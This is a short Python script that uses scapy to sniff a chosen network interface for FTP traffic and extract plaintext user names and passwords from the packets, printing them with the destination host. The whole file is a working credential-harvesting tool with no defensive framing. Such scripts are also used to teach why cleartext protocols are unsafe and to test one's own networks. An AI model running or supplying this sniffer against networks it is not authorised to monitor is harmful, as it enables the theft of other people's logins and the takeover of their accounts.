import re
import argparse
from scapy.all import sniff, IP

def ftp_sniff(pkt):
    if pkt.haslayer(IP):
        dest = pkt[IP].dst
        raw = pkt.sprintf('%Raw.load%')
        user = re.findall(r'(?i)USER (.*)', raw)
        pswd = re.findall(r'(?i)PASS (.*)', raw)
        if user:
            print(f'[*] Detected FTP Login to {dest}')
            print(f'[+] User account: {user[0]}')
        elif pswd:
            print(f'[+] Password: {pswd[0]}')

def main():
    parser = argparse.ArgumentParser(description='FTP Sniffer')
    parser.add_argument('-i', '--interface', required=True, help='Specify interface to listen on')
    args = parser.parse_args()

    print(f'Starting sniffer on interface {args.interface}')
    try:
        sniff(iface=args.interface, filter='tcp port 21', prn=ftp_sniff)
    except KeyboardInterrupt:
        print("\nSniffer stopped.")
        exit(0)

if __name__ == '__main__':
    main()
